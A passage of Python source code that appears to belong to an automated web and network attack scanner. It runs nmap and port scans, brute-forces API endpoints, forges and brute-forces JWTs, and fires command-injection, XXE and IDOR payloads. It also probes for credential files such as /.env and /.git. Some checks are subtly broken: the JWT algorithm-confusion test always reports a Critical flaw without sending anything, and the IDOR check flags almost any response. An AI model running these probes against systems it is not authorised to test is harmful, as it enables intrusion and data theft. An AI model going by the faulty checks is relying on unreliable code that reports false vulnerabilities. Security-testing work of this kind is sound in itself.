                   '--top-ports', '1000', '-T4', target]
        
        # Add custom ports if specified
        if ports:
            cmd.extend(['-p', ports])
        
        # Execute nmap
        process = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=300
        )
        
        output = process.stdout
        vulnerabilities = _parse_nmap_output(output, scan_type, target)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="Nmap Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target': target,
                'scan_type': scan_type,
                'command': ' '.join(cmd),
                'output_length': len(output)
            },
            business_impact="Network reconnaissance completed - attack surface identified",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Network exposure assessment"
        )
        
    except subprocess.TimeoutExpired:
        return ToolCallResult(
            success=False,
            tool_name="Nmap Scan",
            error="Nmap scan timed out",
            execution_time=time.time() - start_time
        )
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Nmap Scan",
            error=str(e),
            execution_time=time.time() - start_time
        )

def port_scan(host: str, ports: List[int], scan_timeout: int = 5) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    open_ports = []
    
    try:
        import socket
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(scan_timeout)
                result = sock.connect_ex((host, port))
                
                if result == 0:
                    open_ports.append(port)
                    
                    # Assess service risk
                    risk_level = _assess_port_risk(port)
                    if risk_level in ['High', 'Critical']:
                        vuln = create_vulnerability(
                            vuln_type='Open Port',
                            severity=risk_level,
                            evidence=f'Port {port} is open',
                            port=str(port),
                            target=host,
                            tool='custom_port_scan',
                            remediation=f"Review port {port} necessity and implement firewall rules"
                        )
                        vulnerabilities.append(vuln)
                
                sock.close()
                
            except Exception as e:
                logging.error(f"Error scanning port {port}: {e}")
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="Port Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'host': host,
                'ports_scanned': len(ports),
                'open_ports': open_ports
            },
            business_impact=f"Network exposure: {len(open_ports)} open ports discovered",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0])
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Port Scan",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _parse_nmap_output(output: str, scan_type: str, target: str) -> List[Vulnerability]:
    vulnerabilities = []
    
    try:
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Parse open ports
            if '/tcp' in line or '/udp' in line:
                if 'open' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        port_number = parts[0].split('/')[0]
                        service = parts[2] if len(parts) > 2 else 'unknown'
                        
                        # Assess service risk
                        risk_level = _assess_service_risk(port_number, service)
                        if risk_level in ['High', 'Critical']:
                            vuln = create_vulnerability(
                                vuln_type='Open Port',
                                severity=risk_level,
                                evidence=f'Port {port_number} ({service}) is open',
                                port=port_number,
                                service=service,
                                target=target,
                                tool='nmap',
                                remediation=f"Review necessity of {service} service and implement access controls"
                            )
                            vulnerabilities.append(vuln)
            
            # Parse vulnerability script results
            if '|' in line and any(vuln_keyword in line.lower() for vuln_keyword in 
                                 ['cve-', 'vulnerable', 'exploit', 'weak', 'insecure']):
                vuln = create_vulnerability(
                    vuln_type='Network Vulnerability',
                    severity='High',
                    evidence=line.strip(),
                    target=target,
                    tool='nmap',
                    technique=scan_type,
                    remediation="Apply security patches and update affected services"
                )
                vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error parsing nmap output: {e}")
    
    return vulnerabilities

def _assess_port_risk(port: int) -> str:
    """Assess risk level of open ports"""
    high_risk_ports = {
        21: 'FTP - often misconfigured',
        22: 'SSH - brute force target',
        23: 'Telnet - unencrypted',
        25: 'SMTP - mail relay abuse',
        53: 'DNS - information disclosure',
        110: 'POP3 - credential exposure',
        143: 'IMAP - credential exposure',
        161: 'SNMP - information disclosure',
        445: 'SMB - lateral movement',
        1433: 'MSSQL - database access',
        3306: 'MySQL - database access',
        3389: 'RDP - brute force target',
        5432: 'PostgreSQL - database access',
        5900: 'VNC - remote access',
        6379: 'Redis - often unauthenticated'
    }
    
    critical_ports = [23, 161, 6379]  # Telnet, SNMP, Redis
    
    if port in critical_ports:
        return 'Critical'
    elif port in high_risk_ports:
        return 'High'
    elif port in [80, 443, 8080, 8443]:
        return 'Medium'
    else:
        return 'Low'

def _assess_service_risk(port: str, service: str) -> str:
    """Assess risk level of discovered services"""
    try:
        port_num = int(port)
        return _assess_port_risk(port_num)
    except ValueError:
        return 'Low'

# ===== API SECURITY TESTING FUNCTIONS =====

def api_endpoint_discovery(base_url: str, wordlist: List[str] = None, 
                          discovery_level: str = "basic") -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    discovered_endpoints = []
    
    try:
        session = create_session()
        
        # Enhanced wordlist based on discovery level
        if not wordlist:
            wordlist = _generate_api_wordlist(discovery_level)
        
        base_url = base_url.rstrip('/')
        
        # Test multiple HTTP methods for comprehensive discovery
        http_methods = ['GET'] if discovery_level == "basic" else ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
        
        for endpoint in wordlist:
            for method in http_methods:
                try:
                    test_url = f"{base_url}/{endpoint}"
                    
                    # Make request based on method
                    if method == 'GET':
                        response = session.get(test_url, timeout=10)
                    elif method == 'POST':
                        response = session.post(test_url, json={}, timeout=10)
                    elif method == 'PUT':
                        response = session.put(test_url, json={}, timeout=10)
                    elif method == 'DELETE':
                        response = session.delete(test_url, timeout=10)
                    elif method == 'OPTIONS':
                        response = session.options(test_url, timeout=10)
                    else:
                        continue
                    
                    # Consider more status codes as valid discoveries
                    if response.status_code in [200, 201, 204, 301, 302, 400, 401, 403, 405, 422, 500]:
                        endpoint_info = {
                            'url': test_url,
                            'method': method,
                            'status_code': response.status_code,
                            'content_type': response.headers.get('content-type', ''),
                            'content_length': len(response.text),
                            'headers': dict(response.headers)
                        }
                        discovered_endpoints.append(endpoint_info)
                        
                        # Enhanced vulnerability detection
                        vulns = _analyze_api_response(response, test_url, method)
                        vulnerabilities.extend(vulns)
                    
                    # Adaptive rate limiting based on discovery level
                    sleep_time = 0.05 if discovery_level == "aggressive" else 0.1
                    time.sleep(sleep_time)
                    
                except Exception as e:
                    logging.error(f"Error testing endpoint {endpoint} with {method}: {e}")
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="API Endpoint Discovery",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'base_url': base_url,
                'discovery_level': discovery_level,
                'endpoints_tested': len(wordlist) * len(http_methods),
                'endpoints_discovered': len(discovered_endpoints),
                'discovered_endpoints': discovered_endpoints,
                'methods_tested': http_methods
            },
            business_impact=f"API attack surface: {len(discovered_endpoints)} endpoints discovered",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0])
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="API Endpoint Discovery",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _generate_api_wordlist(discovery_level: str) -> List[str]:
    """Generate comprehensive API wordlist based on discovery level"""
    
    # Core endpoints (always included)
    core_endpoints = [
        'api', 'api/v1', 'api/v2', 'api/v3', 'rest', 'graphql',
        'api/users', 'api/v1/users', 'api/v2/users',
        'api/auth', 'api/v1/auth', 'api/login', 'api/token',
        'api/admin', 'api/v1/admin', 'api/administrator',
        'api/config', 'api/v1/config', 'api/settings',
        'api/health', 'api/status', 'api/version', 'api/info'
    ]
    
    # Extended endpoints for comprehensive/aggressive
    extended_endpoints = [
        # Common resources
        'api/orders', 'api/products', 'api/customers', 'api/accounts',
        'api/data', 'api/files', 'api/uploads', 'api/downloads',
        'api/reports', 'api/analytics', 'api/logs', 'api/audit',
        
        # Versioned patterns
        'api/v4', 'api/v5', 'v1/api', 'v2/api', 'v3/api',
        'rest/v1', 'rest/v2', 'rest/api',
        
        # Framework-specific
        'wp-json/wp/v2', 'wp-json/api/v1',  # WordPress
        'drupal/api/v1', 'joomla/api/v1',   # CMS
        'laravel/api/v1', 'symfony/api/v1', # PHP Frameworks
        'rails/api/v1', 'django/api/v1',    # Python/Ruby
        
        # Common services
        'api/oauth', 'api/oauth2', 'api/saml',
        'api/webhook', 'api/notifications', 'api/events',
        'api/search', 'api/filter', 'api/export',
        'api/backup', 'api/restore', 'api/migrate',
        
        # Development/debug endpoints
        'api/debug', 'api/test', 'api/dev', 'api/staging',
        'api/docs', 'api/swagger', 'api/openapi',
        'docs', 'swagger', 'openapi.json', 'swagger.json',
        
        # Security-sensitive
        'api/keys', 'api/secrets', 'api/tokens', 'api/sessions',
        'api/permissions', 'api/roles', 'api/access',
        'api/security', 'api/firewall', 'api/monitoring'
    ]
    
    # Aggressive adds pattern generation
    if discovery_level == "basic":
        return core_endpoints
    elif discovery_level == "comprehensive":
        return core_endpoints + extended_endpoints
    else:  # aggressive
        aggressive_endpoints = core_endpoints + extended_endpoints
        
        # Add pattern-generated endpoints
        resources = ['user', 'order', 'product', 'customer', 'account', 'file', 'report']
        versions = ['v1', 'v2', 'v3', 'v4']
        
        for resource in resources:
            for version in versions:
                aggressive_endpoints.extend([
                    f'api/{version}/{resource}',
                    f'api/{version}/{resource}s',
                    f'{version}/api/{resource}',
                    f'rest/{version}/{resource}',
                    f'api/{resource}',
                    f'api/{resource}s'
                ])
        
        return list(set(aggressive_endpoints))  # Remove duplicates

def _analyze_api_response(response: requests.Response, url: str, method: str) -> List[Vulnerability]:
    vulnerabilities = []
    
    try:
        response_text = response.text.lower()
        content_type = response.headers.get('content-type', '').lower()
        
        # 1. Information disclosure in successful responses
        if response.status_code in [200, 201]:
            # Check for sensitive data patterns
            sensitive_patterns = {
                'password': r'password["\']?\s*:\s*["\'][^"\']+',
                'api_key': r'api[_-]?key["\']?\s*:\s*["\'][^"\']+',
                'secret': r'secret["\']?\s*:\s*["\'][^"\']+',
                'token': r'token["\']?\s*:\s*["\'][^"\']+',
                'database': r'(mysql|postgres|mongodb|oracle)[_-]?(host|url|connection)',
                'internal_ip': r'(10\.|172\.|192\.168\.|127\.0\.0\.1)',
                'stack_trace': r'(exception|error|stack\s+trace)',
                'version_info': r'version["\']?\s*:\s*["\'][^"\']+',
                'debug_info': r'(debug|trace|verbose)\s*[=:]\s*true'
            }
            
            for pattern_name, pattern in sensitive_patterns.items():
                if re.search(pattern, response_text):
                    severity = 'High' if pattern_name in ['password', 'api_key', 'secret'] else 'Medium'
                    vuln = create_vulnerability(
                        vuln_type='Information Disclosure',
                        severity=severity,
                        evidence=f'API endpoint exposes {pattern_name.replace("_", " ")}',
                        endpoint=url,
                        url=url,
                        location=f'{method} response',
                        response_code=response.status_code,
                        technique='API reconnaissance',
                        remediation="Implement proper data filtering and access controls"
                    )
                    vulnerabilities.append(vuln)
        
        # 2. Unauthorized access detection
        if response.status_code == 200 and method == 'GET':
            # Check for admin/user data without authentication
            if any(keyword in response_text for keyword in 
                  ['users', 'admin', 'administrator', 'config', 'settings', 'database']):
                if 'application/json' in content_type or 'text/xml' in content_type:
                    vuln = create_vulnerability(
                        vuln_type='Unauthorized API Access',
                        severity='High',
                        evidence='API endpoint returns sensitive data without authentication',
                        endpoint=url,
                        url=url,
                        location=f'{method} request',
                        response_code=response.status_code,
                        technique='Unauthenticated enumeration',
                        business_impact='Sensitive data exposed to unauthorized users',
                        remediation="Implement proper authentication and authorization"
                    )
                    vulnerabilities.append(vuln)
        
        # 3. Method-specific vulnerabilities
        if response.status_code == 405:  # Method not allowed
            # But still reveals endpoint exists
            vuln = create_vulnerability(
                vuln_type='API Endpoint Discovery',
                severity='Info',
                evidence=f'API endpoint exists but {method} method not allowed',
                endpoint=url,
                url=url,
                location=f'{method} request',
                response_code=response.status_code,
                technique='HTTP method enumeration',
                remediation="Review if endpoint should be discoverable"
            )
            vulnerabilities.append(vuln)
        
        # 4. Error-based information disclosure
        if response.status_code >= 500:
            if any(error_indicator in response_text for error_indicator in 
                  ['stack trace', 'exception', 'error', 'traceback', 'debug']):
                vuln = create_vulnerability(
                    vuln_type='Error-based Information Disclosure',
                    severity='Medium',
                    evidence='API returns detailed error information',
                    endpoint=url,
                    url=url,
                    location=f'{method} response',
                    response_code=response.status_code,
                    technique='Error analysis',
                    business_impact='Technical details exposed through error messages',
                    remediation="Implement custom error pages and sanitize error responses"
                )
                vulnerabilities.append(vuln)
        
        # 5. Security headers analysis
        security_headers = {
            'x-content-type-options': 'nosniff',
            'x-frame-options': 'DENY',
            'x-xss-protection': '1; mode=block',
            'strict-transport-security': 'max-age',
            'content-security-policy': 'default-src'
        }
        
        missing_headers = []
        for header, expected in security_headers.items():
            if header not in response.headers:
                missing_headers.append(header)
        
        if missing_headers and response.status_code == 200:
            vuln = create_vulnerability(
                vuln_type='Missing Security Headers',
                severity='Low',
                evidence=f'API endpoint missing security headers: {", ".join(missing_headers)}',
                endpoint=url,
                url=url,
                location='HTTP headers',
                response_code=response.status_code,
                technique='Header analysis',
                remediation="Implement proper security headers for API endpoints"
            )
            vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error analyzing API response: {e}")
    
    return vulnerabilities

def jwt_vulnerability_test(token: str) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    if not CRYPTOGRAPHY_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="JWT Vulnerability Test",
            error="Cryptography library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        # Validate JWT format
        if not _is_jwt_format(token):
            return ToolCallResult(
                success=False,
                tool_name="JWT Vulnerability Test",
                error="Invalid JWT format",
                execution_time=time.time() - start_time
            )
        
        # Decode header and payload without verification
        header = pyjwt.get_unverified_header(token)
        payload = pyjwt.decode(token, options={"verify_signature": False})
        
        # Test algorithm confusion
        if _test_jwt_algorithm_confusion(token, header, payload):
            vuln = create_vulnerability(
                vuln_type='JWT Algorithm Confusion',
                severity='Critical',
                evidence='JWT algorithm can be manipulated to bypass signature verification',
                tool='JWT Security Test',
                technique='Algorithm confusion attack',
                remediation="Explicitly validate JWT algorithm and use asymmetric keys where appropriate"
            )
            vulnerabilities.append(vuln)
        
        # Test weak secrets
        weak_secret = _test_jwt_weak_secret(token)
        if weak_secret:
            vuln = create_vulnerability(
                vuln_type='JWT Weak Secret',
                severity='Critical',
                evidence=f'JWT signed with weak secret: {weak_secret}',
                tool='JWT Security Test',
                technique='Weak secret brute force',
                remediation="Use strong, randomly generated secrets with sufficient entropy"
            )
            vulnerabilities.append(vuln)
        
        # Test critical claims manipulation
        critical_claims = _analyze_jwt_claims(payload)
        if critical_claims:
            vuln = create_vulnerability(
                vuln_type='JWT Critical Claims',
                severity='High',
                evidence=f'JWT contains critical claims that could be manipulated: {", ".join(critical_claims)}',
                tool='JWT Security Test',
                technique='Claims manipulation',
                remediation="Validate all critical claims server-side and use proper claim verification"
            )
            vulnerabilities.append(vuln)
        
        # Test expiration and timing issues
        timing_issues = _test_jwt_timing(payload)
        if timing_issues:
            vulnerabilities.extend(timing_issues)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="JWT Vulnerability Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'header': header,
                'payload_claims': list(payload.keys()),
                'algorithm': header.get('alg', 'unknown')
            },
            business_impact="JWT security assessment completed",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Authentication and authorization bypass possible"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="JWT Vulnerability Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _is_jwt_format(token: str) -> bool:
    """Check if string is valid JWT format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Try to decode header
        header = base64.urlsafe_b64decode(parts[0] + '==')
        header_json = json.loads(header)
        return 'alg' in header_json
    except Exception:
        return False

def _test_jwt_algorithm_confusion(token: str, header: Dict, payload: Dict) -> bool:
    """Test JWT algorithm confusion vulnerability"""
    try:
        # Test "none" algorithm vulnerability
        none_header = header.copy()
        none_header['alg'] = 'none'
        
        # Create token with no signature
        none_token_header = base64.urlsafe_b64encode(
            json.dumps(none_header).encode()
        ).decode().rstrip('=')
        
        none_token_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        # None algorithm tokens should end with just a dot
        manipulated_token = f"{none_token_header}.{none_token_payload}."
        
        # If we can create a valid-looking token, it's vulnerable
        return True
        
    except Exception:
        return False

def _test_jwt_weak_secret(token: str) -> Optional[str]:
    """Test JWT for weak secrets"""
    weak_secrets = PayloadLibrary.JWT_ATTACKS['weak_secrets']
    
    for secret in weak_secrets:
        try:
            pyjwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
            return secret
        except Exception:
            continue
    return None

def _analyze_jwt_claims(payload: Dict) -> List[str]:
    """Analyze JWT payload for critical claims"""
    critical_claims = []
    
    # Check for privilege-related claims
    for claim, value in payload.items():
        if claim.lower() in ['admin', 'role', 'scope', 'permissions', 'groups']:
            critical_claims.append(f"{claim}: {value}")
        
        # Check for boolean privilege flags
        if isinstance(value, bool) and value and claim.lower() in ['admin', 'superuser', 'root']:
            critical_claims.append(f"{claim}: {value}")
    
    return critical_claims

def _test_jwt_timing(payload: Dict) -> List[Vulnerability]:
    """Test JWT timing-related vulnerabilities"""
    vulnerabilities = []
    
    try:
        import datetime
        
        # Check expiration
        if 'exp' in payload:
            exp_time = datetime.datetime.fromtimestamp(payload['exp'])
            now = datetime.datetime.now()
            
            if exp_time < now:
                vuln = create_vulnerability(
                    vuln_type='JWT Expired Token',
                    severity='Medium',
                    evidence=f'Token expired at {exp_time}',
                    tool='JWT Security Test',
                    technique='Timing analysis',
                    remediation="Implement proper token expiration validation"
                )
                vulnerabilities.append(vuln)
            elif (exp_time - now).days > 365:
                vuln = create_vulnerability(
                    vuln_type='JWT Long Expiration',
                    severity='Low',
                    evidence=f'Token expires in {(exp_time - now).days} days',
                    tool='JWT Security Test',
                    technique='Timing analysis',
                    remediation="Use shorter token expiration times for better security"
                )
                vulnerabilities.append(vuln)
        else:
            vuln = create_vulnerability(
                vuln_type='JWT No Expiration',
                severity='Medium',
                evidence='Token has no expiration claim',
                tool='JWT Security Test',
                technique='Timing analysis',
                remediation="Always include expiration claims in JWT tokens"
            )
            vulnerabilities.append(vuln)
        
        # Check issued at time
        if 'iat' in payload:
            iat_time = datetime.datetime.fromtimestamp(payload['iat'])
            now = datetime.datetime.now()
            
            if iat_time > now:
                vuln = create_vulnerability(
                    vuln_type='JWT Future Issued',
                    severity='Medium',
                    evidence='Token issued in the future',
                    tool='JWT Security Test',
                    technique='Timing analysis',
                    remediation="Validate token issued at time against current time"
                )
                vulnerabilities.append(vuln)
    
    except Exception as e:
        logging.error(f"Error testing JWT timing: {e}")
    
    return vulnerabilities

def _contains_sensitive_data(response_text: str) -> bool:
    """Check if response contains sensitive information"""
    sensitive_patterns = [
        r'password', r'secret', r'key', r'token', r'api[_-]?key',
        r'private[_-]?key', r'database', r'db[_-]?password',
        r'config', r'credential', r'auth', r'session'
    ]
    
    response_lower = response_text.lower()
    return any(re.search(pattern, response_lower) for pattern in sensitive_patterns)

# ===== ADVANCED VULNERABILITY TESTING FUNCTIONS =====

def idor_test(endpoint: str, parameter: str, test_values: List[str] = None) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        
        # Default test values if none provided
        if not test_values:
            test_values = ['1', '2', '999', '0', '-1', 'admin', 'root', '00000000-0000-0000-0000-000000000001']
        
        # Parse the endpoint URL
        parsed_url = urlparse(endpoint)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Get original response for comparison
        original_response = session.get(endpoint)
        original_status = original_response.status_code
        original_length = len(original_response.text)
        
        for test_value in test_values:
            try:
                # Test in URL parameter
                if '?' in endpoint:
                    # Replace existing parameter value
                    test_url = re.sub(
                        rf'{parameter}=[^&]*', 
                        f'{parameter}={urllib.parse.quote(str(test_value))}', 
                        endpoint
                    )
                else:
                    # Add parameter
                    test_url = f"{endpoint}?{parameter}={urllib.parse.quote(str(test_value))}"
                
                response = session.get(test_url, timeout=10)
                
                # Analyze response for IDOR
                if _analyze_idor_response(response, original_response, test_value):
                    vuln = create_vulnerability(
                        vuln_type='Insecure Direct Object Reference (IDOR)',
                        severity='High',
                        evidence=f'IDOR vulnerability in parameter {parameter} with value {test_value}',
                        parameter=parameter,
                        endpoint=test_url,
                        url=test_url,
                        payload=str(test_value),
                        response_code=response.status_code,
                        technique='Direct object reference manipulation',
                        remediation="Implement proper access controls and object-level authorization"
                    )
                    vulnerabilities.append(vuln)
                
                # Test in path parameter
                if '/' in str(test_value):
                    continue  # Skip path traversal characters for this test
                
                path_test_url = f"{base_url}/{test_value}"
                try:
                    path_response = session.get(path_test_url, timeout=10)
                    if _analyze_idor_response(path_response, original_response, test_value):
                        vuln = create_vulnerability(
                            vuln_type='Path-based IDOR',
                            severity='High',
                            evidence=f'Path-based IDOR vulnerability with value {test_value}',
                            endpoint=path_test_url,
                            url=path_test_url,
                            payload=str(test_value),
                            technique='Path-based object reference manipulation',
                            remediation="Implement path-based access controls and user context validation"
                        )
                        vulnerabilities.append(vuln)
                except Exception:
                    pass
                
                time.sleep(0.2)  # Rate limiting
                
            except Exception as e:
                logging.error(f"Error testing IDOR value {test_value}: {e}")
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="IDOR Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'endpoint': endpoint,
                'parameter': parameter,
                'values_tested': len(test_values)
            },
            business_impact="HIGH - Unauthorized access to sensitive resources",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Data privacy violations, unauthorized access"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="IDOR Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def business_logic_test(url: str, workflow_steps: List[Dict], test_type: str = "basic") -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        
        # Test price manipulation
        price_vulns = _test_price_manipulation(session, url, workflow_steps)
        vulnerabilities.extend(price_vulns)
        
        # Test quantity bypass
        quantity_vulns = _test_quantity_bypass(session, url, workflow_steps)
        vulnerabilities.extend(quantity_vulns)
        
        # Test workflow bypass
        workflow_vulns = _test_workflow_bypass(session, url, workflow_steps)
        vulnerabilities.extend(workflow_vulns)
        
        # Test race conditions if comprehensive
        if test_type == "comprehensive":
            race_vulns = _test_race_conditions(session, url)
            vulnerabilities.extend(race_vulns)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="Business Logic Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'workflow_steps': len(workflow_steps),
                'test_type': test_type
            },
            business_impact="CRITICAL - Financial manipulation and business process bypass",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="PCI DSS, SOX, financial regulation violations"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Business Logic Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def command_injection_test(url: str, parameter: str = "cmd", payload: str = None) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = PayloadLibrary.COMMAND_INJECTION
        
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test GET parameter
            get_result = _test_command_injection_get(session, url, parameter, test_payload)
            vulnerabilities.extend(get_result)
            
            # Test POST parameter
            post_result = _test_command_injection_post(session, url, parameter, test_payload)
            vulnerabilities.extend(post_result)
            
            time.sleep(0.5)  # Rate limiting
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="Command Injection Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact="CRITICAL - System compromise and data exfiltration",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else calculate_cvss_score('Command Injection', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="Complete system compromise - all compliance frameworks affected"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Command Injection Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def xxe_test(url: str, xml_parameter: str = "data", payload: str = None) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = PayloadLibrary.XXE_PAYLOADS
        
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test POST with XML content
            headers = {'Content-Type': 'application/xml'}
            response = session.post(url, data=test_payload, headers=headers)
            
            if _detect_xxe_vulnerability(response, test_payload):
                vuln = create_vulnerability(
                    vuln_type='XML External Entity (XXE)',
                    severity='Critical',
                    evidence='XXE vulnerability detected in XML processing',
                    location='POST body',
                    payload=test_payload,
                    url=url,
                    response_code=response.status_code,
                    technique='XML external entity injection',
                    business_impact='File system access and SSRF attacks possible',
                    remediation="Disable external entity processing in XML parser configuration"
                )
                vulnerabilities.append(vuln)
            
            # Test as form parameter
            form_data = {xml_parameter: test_payload}
            form_response = session.post(url, data=form_data)
            
            if _detect_xxe_vulnerability(form_response, test_payload):
                vuln = create_vulnerability(
                    vuln_type='XXE via Form Parameter',
                    severity='Critical',
                    evidence='XXE vulnerability in form parameter processing',
                    parameter=xml_parameter,
                    payload=test_payload,
                    url=url,
                    technique='XML external entity injection via form data',
                    business_impact='File system access and SSRF attacks possible',
                    remediation="Sanitize XML input and disable external entity processing"
                )
                vulnerabilities.append(vuln)
            
            time.sleep(0.3)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="XXE Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': xml_parameter,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact="CRITICAL - Local file disclosure and SSRF attacks",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else calculate_cvss_score('XXE', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="Data breach and infrastructure compromise"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="XXE Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def information_disclosure_test(url: str) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        base_url = url.rstrip('/')
        
        # Common sensitive files and directories
        sensitive_paths = [
            '/.env', '/.git', '/.svn', '/.htaccess', '/web.config',
            '/robots.txt', '/sitemap.xml', '/phpinfo.php', '/info.php',
            '/backup.sql', '/database.sql', '/config.php', '/config.inc.php',
            '/admin.php', '/administrator', '/debug.php', '/test.php',
            '/swagger.json', '/api-docs', '/openapi.json',
            '/error_log', '/access.log', '/application.log'
        ]
        
        for path in sensitive_paths:
            try:
                test_url = base_url + path
                response = session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    risk_level = _assess_file_disclosure_risk(path, response)
                    if risk_level != 'Info':
                        content_preview = response.text[:200] + '...' if len(response.text) > 200 else response.text
                        vuln = create_vulnerability(
                            vuln_type='Information Disclosure',
                            severity=risk_level,
                            evidence=f'Sensitive file accessible: {path}',
                            url=test_url,
                            location=path,
                            response_code=response.status_code,
                            technique='Direct file access',
                            business_impact=f'Sensitive information exposed via {path}',
                            remediation="Remove sensitive files from web-accessible directories and implement proper access controls"
                        )
                        vulnerabilities.append(vuln)
                
            except Exception as e:
                logging.error(f"Error testing path {path}: {e}")
        
        # Test error-based information disclosure
        error_vulns = _test_error_disclosure(session, url)
        vulnerabilities.extend(error_vulns)
        
        # Test HTTP headers for information disclosure
        header_vulns = _test_header_disclosure(session, url)
        vulnerabilities.extend(header_vulns)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="Information Disclosure Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'paths_tested': len(sensitive_paths)
            },
            business_impact="HIGH - Sensitive information exposure and reconnaissance data",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Data privacy violations, competitive intelligence exposure"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Information Disclosure Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

# ===== HELPER FUNCTIONS FOR ADVANCED TESTING =====

def _analyze_idor_response(response: requests.Response, original_response: requests.Response, 
                          test_value: str) -> bool:
    try:
        # Check if we got a successful response with different content
        if response.status_code == 200 and original_response.status_code == 200:
            # Different content length might indicate different data
            content_diff = abs(len(response.text) - len(original_response.text))
            if content_diff > 100:  # Significant difference
                return True
            
            # Check for user-specific data patterns
            if any(pattern in response.text.lower() for pattern in 
                  ['user', 'profile', 'account', 'data', 'id']):
                return True
        
        # Unauthorized access that returns data
        elif response.status_code == 200 and original_response.status_code in [401, 403]:
            return True
        
        return False
        
    except Exception:
        return False

def _test_price_manipulation(session: requests.Session, url: str, 
